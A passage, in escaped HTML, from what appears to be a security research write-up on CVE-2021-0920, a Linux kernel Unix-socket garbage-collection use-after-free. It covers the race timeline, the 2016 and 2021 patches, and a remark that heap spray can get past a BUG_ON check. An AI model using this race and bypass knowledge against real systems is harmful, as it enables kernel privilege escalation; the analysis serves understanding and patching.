class=\"ykcrMYlEiJ-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"ykcrMYlEiJ-c4\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"ykcrMYlEiJ-c22\"&gt;&lt;span&gt;Start calling &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;recvmsg&lt;/span&gt;&lt;span&gt;&amp;nbsp;with &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;MSG_PEEK&lt;/span&gt;&lt;span&gt;&amp;nbsp;flag from &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;f &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;1&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c11\"&gt;0&lt;/span&gt;&lt;span&gt;&amp;rsquo;, which would expect to receive &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;f &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;0&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c11\"&gt;0&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&amp;#39;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"ykcrMYlEiJ-c4\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"ykcrMYlEiJ-c6\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=\"ykcrMYlEiJ-c17\"&gt;&lt;td class=\"ykcrMYlEiJ-c4\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"ykcrMYlEiJ-c6\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"ykcrMYlEiJ-c4\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"ykcrMYlEiJ-c22\"&gt;&lt;span&gt;Get &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;skb = skb_peek(&amp;amp;sk-&amp;gt;sk_receive_queue)&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;skb&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&amp;nbsp;is going to be freed by thread 0.&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"ykcrMYlEiJ-c4\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"ykcrMYlEiJ-c6\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=\"ykcrMYlEiJ-c17\"&gt;&lt;td class=\"ykcrMYlEiJ-c4\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"ykcrMYlEiJ-c22\"&gt;&lt;span&gt;Stage2: for&lt;/span&gt;&lt;span&gt;&lt;img src=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgRTVI1goYtLkJZYRh0P5Wj_jeCjDeIhbMLEzwbzMCMWdag6uBicpIv7TtDorvArzkMmQGMRq6Ss5WdVDwyKTZE9frPBY44fOF667d2D7rKxarcAfp9x9t-YrNRielyFYOgI0998OI0TplaeHW7CGyz4SAFs2udorAlUMxe4gaCPYqr2zP9AjmKbyip/s260/image18.png\" border=\"0\" alt=\"\" style=\"max-height: 750px; max-width: 100px; box-shadow: none; --webkit-box-shadow: none; --moz-box-shadow: none; border:0; display: inline;\" title=\"\" /&gt;, calls &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;__skb_unlink&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;kfree_skb&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&amp;nbsp;later.&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"ykcrMYlEiJ-c4\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"ykcrMYlEiJ-c6\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"ykcrMYlEiJ-c4\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"ykcrMYlEiJ-c6\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=\"ykcrMYlEiJ-c17\"&gt;&lt;td class=\"ykcrMYlEiJ-c4\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"ykcrMYlEiJ-c6\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"ykcrMYlEiJ-c4\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"ykcrMYlEiJ-c22\"&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;state-&amp;gt;recv_actor(skb, skip, chunk, state)&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c34 c19 c7 c39 c42\"&gt;UAF&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"ykcrMYlEiJ-c4\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"ykcrMYlEiJ-c6\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=\"ykcrMYlEiJ-c17\"&gt;&lt;td class=\"ykcrMYlEiJ-c4\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"ykcrMYlEiJ-c22\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;GC finished.&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"ykcrMYlEiJ-c4\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"ykcrMYlEiJ-c6\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"ykcrMYlEiJ-c4\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"ykcrMYlEiJ-c6\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=\"ykcrMYlEiJ-c17\"&gt;&lt;td class=\"ykcrMYlEiJ-c4\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"ykcrMYlEiJ-c6\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"ykcrMYlEiJ-c4\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"ykcrMYlEiJ-c6\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"ykcrMYlEiJ-c4\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"ykcrMYlEiJ-c22\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;Start garbage collection.&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=\"ykcrMYlEiJ-c17\"&gt;&lt;td class=\"ykcrMYlEiJ-c4\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"ykcrMYlEiJ-c6\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"ykcrMYlEiJ-c4\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"ykcrMYlEiJ-c6\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"ykcrMYlEiJ-c4\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"ykcrMYlEiJ-c22\"&gt;&lt;span&gt;Get &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;f &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;1&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c11\"&gt;0&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&amp;rsquo;&amp;rsquo;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;\n &lt;p class=\"ykcrMYlEiJ-c5\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12 ykcrMYlEiJ-c20\"&gt;&lt;span&gt;Therefore, the race condition causes a UAF of the skb object. At first glance, we should blame the second &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;recvmsg&lt;/span&gt;&lt;span&gt;&amp;nbsp;syscall because it clears &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;skb.fp&lt;/span&gt;&lt;span&gt;, the passed file list.&lt;/span&gt;&lt;span&gt;&amp;nbsp;However, if the first &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;recvmsg&lt;/span&gt;&lt;span&gt;&amp;nbsp;syscall doesn&amp;rsquo;t set the &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;MSG_PEEK&lt;/span&gt;&lt;span&gt;&amp;nbsp;flag, the UAF can be avoided because &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;unix_notinflight&lt;/span&gt;&lt;span&gt;&amp;nbsp;is serialized with the garbage collection. In other words, the kernel makes sure the garbage collection is either not processed or finished before decrementing the inflight count and removing the skb. After &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;unix_notinflight&lt;/span&gt;&lt;span&gt;, the receiver obtains &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;f&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;1&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c11\"&gt;1&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&amp;#39; and inflight sockets don&amp;#39;t form an unbreakable cycle.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c5\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12 ykcrMYlEiJ-c20\"&gt;&lt;span&gt;Since &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;MSG_PEEK&lt;/span&gt;&lt;span&gt;&amp;nbsp;is not serialized with the garbage collection, when &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;recvmsg&lt;/span&gt;&lt;span&gt;&amp;nbsp;is called with &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;MSG_PEEK&lt;/span&gt;&lt;span&gt;&amp;nbsp;set, the kernel still considers &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c8\"&gt;f &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c15\"&gt;1&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c11\"&gt;1&lt;/span&gt;&lt;span&gt;&amp;nbsp;as a garbage candidate. For this reason, the following next &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;recvmsg&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&amp;nbsp;will eventually trigger the bug due to the inconsistent state of the garbage collection process.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12 ykcrMYlEiJ-c20\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&amp;nbsp;&lt;/span&gt;&lt;/p&gt;&lt;h1 class=\"ykcrMYlEiJ-c30 ykcrMYlEiJ-c20\" id=\"h.wrjvlggcdxoy\"&gt;&lt;span class=\"ykcrMYlEiJ-c47 ykcrMYlEiJ-c39\"&gt;Patch Analysis&lt;/span&gt;&lt;/h1&gt;&lt;h2 class=\"ykcrMYlEiJ-c30 ykcrMYlEiJ-c20\" id=\"h.de5p59plssty\"&gt;&lt;span class=\"ykcrMYlEiJ-c1\"&gt;CVE-2021-0920 was found in 2016&lt;/span&gt;&lt;/h2&gt;\n &lt;p class=\"ykcrMYlEiJ-c12 ykcrMYlEiJ-c20\"&gt;&lt;span&gt;The vulnerability was &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c9\"&gt;&lt;a class=\"ykcrMYlEiJ-c261\" href=\"https://patchwork.ozlabs.org/project/netdev/patch/CAOssrKcfncAYsQWkfLGFgoOxAQJVT2hYVWdBA6Cw7hhO8RJ_wQ@mail.gmail.com/\"&gt;initially reported to the Linux kernel community in 2016&lt;/a&gt;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;. The researcher also provided the correct patch advice but it was not accepted by the Linux kernel community:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c31 ykcrMYlEiJ-c20\"&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c31 ykcrMYlEiJ-c20\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&lt;a href=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh8WLJ5TaSrwBSyzsB2cnn3WlhRBqZzDHyOAnU8PWvMGr9d2l85FCYHw8fwiHRmFRMtPBMSe3kcFyISMGzuqmFyc0Ks5gJymqNPxh_kHdy59iHrUXTkpc5MTEyoOSroIHMzmqgQCibycvyxMRR-kUmjKIB3y0kqNHvN1TQULEUY8f04pIe65f-z3l3A/s1202/image65.png\" style=\"display: block; padding: 1em 0;text-align: center;\"&gt;&lt;img src=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh8WLJ5TaSrwBSyzsB2cnn3WlhRBqZzDHyOAnU8PWvMGr9d2l85FCYHw8fwiHRmFRMtPBMSe3kcFyISMGzuqmFyc0Ks5gJymqNPxh_kHdy59iHrUXTkpc5MTEyoOSroIHMzmqgQCibycvyxMRR-kUmjKIB3y0kqNHvN1TQULEUY8f04pIe65f-z3l3A/s1202/image65.png\" border=\"0\" alt=\"Linux kernel developers: Why would I apply a patch that&amp;#39;s an RFC, doesn&amp;#39;t have a proper commit message, lacks a proper signoff, and also lacks ACK&amp;#39;s and feedback from other knowledgable developers?\" style=\"max-height: 750px; max-width: 600px;\"title=\"Linux kernel developers: Why would I apply a patch that&amp;#39;s an RFC, doesn&amp;#39;t have a proper commit message, lacks a proper signoff, and also lacks ACK&amp;#39;s and feedback from other knowledgable developers?\" /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c31 ykcrMYlEiJ-c20\"&gt;&lt;span class=\"c34 c19 c32\"&gt;Patch was not applied in 2016&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c5\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12 ykcrMYlEiJ-c20\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;In theory, anyone who saw this patch might come up with an exploit against the faulty garbage collector. &lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c5\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;h2 class=\"ykcrMYlEiJ-c30 ykcrMYlEiJ-c20\" id=\"h.4z83prp6b89e\"&gt;&lt;span class=\"ykcrMYlEiJ-c41\"&gt;Patch in 2021&lt;/span&gt;&lt;/h2&gt;\n &lt;p class=\"ykcrMYlEiJ-c12 ykcrMYlEiJ-c20\"&gt;&lt;span&gt;Let&amp;rsquo;s check the official &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c9\"&gt;&lt;a class=\"ykcrMYlEiJ-c261\" href=\"https://lore.kernel.org/lkml/20210802134333.066918619@linuxfoundation.org/\"&gt;patch&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;for CVE-2021-0920. For the &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;MSG_PEEK&lt;/span&gt;&lt;span&gt;&amp;nbsp;branch, it &lt;/span&gt;&lt;span&gt;requests the&lt;/span&gt;&lt;span&gt;&amp;nbsp;garbage collection lock &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;unix_gc_lock&lt;/span&gt;&lt;span&gt;&amp;nbsp;before performing sensitive actions&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&amp;nbsp;and immediately releases it afterwards:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c5\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.35ff1e948ec741d79429e84cee5745d3afcaaae5\"&gt;&lt;/a&gt;&lt;a id=\"t.19\"&gt;&lt;/a&gt;&lt;table class=\"ykcrMYlEiJ-c33\"&gt;&lt;tr class=\"ykcrMYlEiJ-c17\"&gt;&lt;td class=\"ykcrMYlEiJ-c18\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;&amp;hellip;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;+&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;spin_lock&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;(&amp;amp;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;unix_gc_lock&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;+&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;spin_unlock&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;(&amp;amp;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;unix_gc_lock&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;&amp;hellip;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;\n &lt;p class=\"ykcrMYlEiJ-c5\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12 ykcrMYlEiJ-c20\"&gt;&lt;span&gt;The patch is confusing - it&amp;rsquo;s rare to see such lock usage in software development. Regardless, the &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;MSG_PEEK&lt;/span&gt;&lt;span&gt;&amp;nbsp;flag now waits for the completion of the garbage collector, so the UAF issue is resolved.&lt;/span&gt;&lt;/p&gt;&lt;h2 class=\"ykcrMYlEiJ-c30 ykcrMYlEiJ-c20\" id=\"h.9ft0l34fnpmk\"&gt;&lt;span class=\"ykcrMYlEiJ-c41\"&gt;BUG_ON Added in 2017&lt;/span&gt;&lt;/h2&gt;\n &lt;p class=\"ykcrMYlEiJ-c12 ykcrMYlEiJ-c20\"&gt;&lt;span&gt;Andrey Ulanov from Google in 2017 found another issue in &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;unix_gc&lt;/span&gt;&lt;span&gt;&amp;nbsp;and provided a fix &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c9\"&gt;&lt;a class=\"ykcrMYlEiJ-c261\" href=\"https://lore.kernel.org/lkml/20170315031642.19576-1-andreyu@google.com/\"&gt;commit&lt;/a&gt;&lt;/span&gt;&lt;span&gt;. Additionally, the patch added a &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;BUG_ON&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&amp;nbsp;for the inflight count:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c5\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.9ddfb92c81bd3f8420f9ee8f3bc9bd197a02f533\"&gt;&lt;/a&gt;&lt;a id=\"t.20\"&gt;&lt;/a&gt;&lt;table class=\"ykcrMYlEiJ-c33\"&gt;&lt;tr class=\"ykcrMYlEiJ-c17\"&gt;&lt;td class=\"ykcrMYlEiJ-c18\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c14\"&gt;void&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;unix_notinflight&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;(&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c14\"&gt;struct&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;user_struct &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;*&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;user&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;,&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c14\"&gt;struct&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;file &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;*&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;fp&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;)&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c14\"&gt;if&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;(&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;s&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;)&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c14\"&gt;struct&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;unix_sock &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;*&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;u &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;=&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;unix_sk&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;(&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;s&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c0 ykcrMYlEiJ-c13\"&gt;&amp;nbsp;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;+&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; BUG_ON&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;(!&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;atomic_long_read&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;(&amp;amp;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;u&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;inflight&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;));&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; BUG_ON&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;(&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;list_empty&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;(&amp;amp;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;u&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;link&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;));&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c0 ykcrMYlEiJ-c13\"&gt;&amp;nbsp;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12\"&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c14\"&gt;if&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;(&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;atomic_long_dec_and_test&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;(&amp;amp;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;u&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c0\"&gt;inflight&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c10\"&gt;))&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;\n &lt;p class=\"ykcrMYlEiJ-c5\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12 ykcrMYlEiJ-c20\"&gt;&lt;span&gt;At first glance, i&lt;/span&gt;&lt;span&gt;t seems that&lt;/span&gt;&lt;span&gt;&amp;nbsp;the &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;BUG_ON&lt;/span&gt;&lt;span&gt;&amp;nbsp;can prevent CVE-2021-0920 from being exploitable. However, if the exploit code can delay garbage collection by crafting a large amount of fake garbage, &amp;nbsp;it can waive the &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3\"&gt;BUG_ON&lt;/span&gt;&lt;span&gt;&amp;nbsp;check by heap spray.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c5\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;h2 class=\"ykcrMYlEiJ-c30 ykcrMYlEiJ-c20\" id=\"h.f7eb84wuwvc6\"&gt;&lt;span class=\"ykcrMYlEiJ-c41\"&gt;New Garbage Collection&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c41\"&gt;Discovered &lt;/span&gt;&lt;span&gt;in 